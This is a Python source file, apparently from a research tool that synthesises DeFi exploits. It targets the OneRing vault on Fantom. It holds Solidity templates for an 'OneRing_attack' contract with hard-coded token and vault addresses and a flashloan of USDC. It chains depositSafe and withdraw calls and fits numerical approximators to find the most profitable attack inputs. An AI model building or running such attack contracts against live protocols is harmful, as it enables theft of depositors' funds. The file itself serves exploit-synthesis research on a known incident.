import sys
import os
import itertools
import math
import builtins
import time
from black import out
from numpy import insert
import config

from scipy.interpolate import griddata, interp1d
import scipy.optimize as optimize
from scipy.interpolate import NearestNDInterpolator

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.append(os.path.dirname(SCRIPT_DIR))
from Actions.SingleApprox.SingleApprox import single_round_approx, predict

from Actions.Utils import *
from Actions.UtilsPrecision import *

class OneRingAction():

    initialStates = [4448686, 4185979]
        #  [0]: vault.balanceWithInvested // 4448686
        #  [1]: vault.totalSupply;  // 4185979

    globalStates = [4448686, 4185979]


    startStr_contract  = """// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;
import "./interfaces/OneRingI.sol";


contract OneRing_attack {
    IUSDC USDC = IUSDC(0x04068DA6C83AFCFA0e13ba15A6696662335D5B75);    
    IOneRingVault vault = IOneRingVault(0x4e332D616b5bA1eDFd87c899E534D996c336a2FC);
    // source code at 0xC06826F52F29B34C5d8b2C61aBf844CEBCf78ABF

    string str1 = "";
    string str2 = "";

    string str89 = "";
    string str90 = "";


    constructor() payable {
        USDC.approve(address(vault), 2**256 - 1);
    }

    receive() external payable {}

"""

    startStr_attack = """
    function attack( $$_$$ ) public {
        // ===================== Flashloan of 1 5000 0000 USDC =================="""
    
    endStr_attack = """revert(ProfitSummary());
    }\n"""

    endStr_contract = """
    function VaultSummary() internal returns (string memory _uintAsString) {
        uint balanceWithInvested = vault.balanceWithInvested() / 10 ** 18;
        uint totalSupply = vault.totalSupply() / 10 ** 18;
        str89 = append("balanceWithInvested: ", uint2str(balanceWithInvested));
        str90 = append(" totalSupply: ", uint2str(totalSupply));
        return append(str89, str90);
    }

    function ProfitSummary() internal returns (string memory _uintAsString){
        uint balance1 = USDC.balanceOf(address(this)) / 10 ** 6;
        return append("USDC balance: ", uint2str(balance1));
    }

    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }


    function append(string memory a, string memory b) internal pure returns (string memory) {
        return string(abi.encodePacked(a, b));
    }

    function appendWithSpace(string memory a, string memory b) internal pure returns (string memory) {
        return append(a, append(" ", b));
    }

}

                """
    
    initialBalances = {"USDC": 150000000}
    currentBalances = {"USDC": 150000000}
    TargetTokens = {'USDC'}
    TokenPrices = {'USDC': 1.0}

    @classmethod
    def resetBalances(cls):
        cls.currentBalances = cls.initialBalances.copy()
        cls.globalStates = cls.initialStates.copy()


    def calcProfit(stats):
        if stats == None or len(stats) != 1 or stats[0] == 20:
            return 0
        profit = stats[0] - 150000000
        #        USDC       
        return profit

    @classmethod
    def calcProfit2(cls):
        profit = 0
        for token in cls.currentBalances.keys():
            currentBalance = cls.currentBalances[token]
            earned = currentBalance
            if token in cls.initialBalances.keys():
                initialBalance = cls.initialBalances[token]
                earned -= initialBalance
            if token in cls.TokenPrices.keys():
                profit += earned * cls.TokenPrices[token]
        return profit

    @classmethod
    def buildAttackContract(cls, ActionList):
        start = cls.startStr_attack
        end = cls.endStr_attack
        return buildAttackContract(start, ActionList, end)
        
    @classmethod
    def buildCollectorContract(cls, ActionList):
        start = cls.startStr_attack
        end = '''
        }
        '''
        return buildCollectorContract(start, ActionList, end)

    def ToString(ActionList):
        return ToString(ActionList)


    def initialPass():
        action1 = DepositSafeOShare
        action2 = WithdrawOShare
        
        action_list_1 = [action1, action2]

        action1_prestate_dependency = [action1, action2]
        action2_prestate_dependency = [action1, action2]

        # # seq of actions
        ActionWrapper = OneRingAction
        action_lists = [action1_prestate_dependency + [action1], action2_prestate_dependency + [action2] ]
                        
        start = time.time()
        initialPassCollectData( action_lists, ActionWrapper)
        ShowDataPointsForEachAction( action_list_1 )
        end = time.time()
        print("in total it takes %f seconds" % (end - start))

    def runinitialPass():
        return


class DepositSafeOShare(OneRingAction):
    points = []
    values = [[], [], []]

    hasNewDataPoints = True
    approximator0 = None
    approximator1 = None
    approximator2 = None


    # Action Specific Variables
    numInputs = 1
    tokensIn = ['USDC']
    tokensOut = ['OShare']
    range = [0, 150000000]   # 80000000
        
    @classmethod
    def actionStr(cls):
        action = "      // Action: " + cls.__name__ + "\n"
        action += '''        vault.depositSafe( $$ *1e6,address(USDC),0);\n'''
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: " + cls.__name__ + "\n"
        action += '''        str1 = VaultSummary();
        uint OShareGot = vault.balanceOf(address(this));

        vault.depositSafe( $$ *1e6,address(USDC),0);
        
        OShareGot = ( vault.balanceOf(address(this)) - OShareGot ) / 1e18;
        str2 = VaultSummary();
        revert(appendWithSpace(str1, appendWithSpace(str2, uint2str(OShareGot))));
'''
        return action

    @classmethod
    def aliquotValues(cls, values):
        # print(values)
        return values[2], values[3], values[4]

    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 5:
            return -1

        point = [values[0], values[1], inputs[-1]]
        if point in cls.points: 
            return -2

        cls.points.append(point) 

        v0, v1, v2= cls.aliquotValues(values)
        cls.values[0].append(v0)  # balanceWithInvested
        cls.values[1].append(v1)  # totalSupply
        cls.values[2].append(v2)  # OShareGot

        return 1

    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])
        cls.hasNewDataPoints = False


    @classmethod
    def simulate(cls, input):

        inputs = [cls.globalStates[0], cls.globalStates[1], input]
        output0 = cls.approximator0(inputs)
        output1 = cls.approximator1(inputs)
        output2 = cls.approximator2(inputs)

        return output0, output1, output2 


    @classmethod
    def transit(cls, input): # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()

        cls.currentBalances['USDC'] -= input
        output0, output1, output2 = cls.simulate(input)

        cls.globalStates[0] = output0
        cls.globalStates[1] = output1

        if "OShare" not in cls.currentBalances:
            cls.currentBalances["OShare"] = output2
        else:
            cls.currentBalances["OShare"] += output2

        return

    @classmethod
    def string(cls):
        return cls.__name__


class WithdrawOShare(OneRingAction):
    points = []
    values = [[], [], []]

    hasNewDataPoints = True
    approximator0 = None
    approximator1 = None
    approximator2 = None

    # Action Specific Variables
    numInputs = 1
    tokensIn = ['OShare']
    tokensOut = ['USDC']
    range = [0, 60000000]   # 41965511
        
    @classmethod
    def actionStr(cls):
        action = "      // Action: " + cls.__name__ + "\n"
        action += '''        vault.withdraw( $$ * 1e18, address(USDC));\n'''
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: " + cls.__name__ + "\n"
        action += '''                str1 = VaultSummary();
        uint USDCGot = USDC.balanceOf(address(this));

        vault.withdraw( $$ * 1e18, address(USDC));

        USDCGot = ( USDC.balanceOf(address(this)) - USDCGot ) / 1e6;
        str2 = VaultSummary();
        revert(appendWithSpace(str1, appendWithSpace(str2, uint2str(USDCGot))));
'''
        return action

    @classmethod
    def aliquotValues(cls, values):
        # print(values)
        return values[2], values[3], values[4]

    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 5:
            return -1

        point = [values[0], values[1], inputs[-1]]
        if point in cls.points:
            return -2

        cls.points.append(point) 
        v0, v1, v2= cls.aliquotValues(values)
        cls.values[0].append(v0)  # balanceWithInvested
        cls.values[1].append(v1)  # totalSupply
        cls.values[2].append(v2)  # USDCOut
        return 1

    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])
        cls.hasNewDataPoints = False


    @classmethod
    def simulate(cls, input):
        inputs = [cls.globalStates[0], cls.globalStates[1], input]
        output0 = cls.approximator0(inputs)
        output1 = cls.approximator1(inputs)
        output2 = cls.approximator2(inputs)
        return output0, output1, output2 


    @classmethod
    def transit(cls, input): # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()

        cls.currentBalances['OShare'] -= input

        output0, output1, output2 = cls.simulate(input)

        cls.globalStates[0] = output0
        cls.globalStates[1] = output1


        cls.currentBalances["USDC"] += output2
        return

    @classmethod
    def string(cls):
        return cls.__name__



def main():

    # config.method
    # config.contract_name 
    # config.initialEther 
    # config.blockNum
    # config.ETHorBSCorDVDorFantom

    config.method = 1
    config.ETHorBSCorDVDorFantom = 3
    config.initialEther = None
    config.blockNum = 34041498
    config.contract_name = "OneRing_attack"

    
# Test for initial pass of data collecton: 
    OneRingAction.initialPass()
    # OneRingAction.runinitialPass()
    
    # action1 = DepositSafeOShare
    # action2 = WithdrawOShare

    # action_list = [action1, action2]
    # initial_guess = [80000000, 41965511]
    # ActionWrapper = OneRingAction


    # # print("actual profit: ", getActualProfit(initial_guess, ActionWrapper, action_list))

    # actual_profit = 1534752
    # print("actual profit: ", actual_profit)
    # e1, e2, e3, e4 = testCounterExampleDrivenApprox(initial_guess, ActionWrapper, action_list)
    # return actual_profit, e1, e2, e3, e4


if __name__ == "__main__":
    main()
    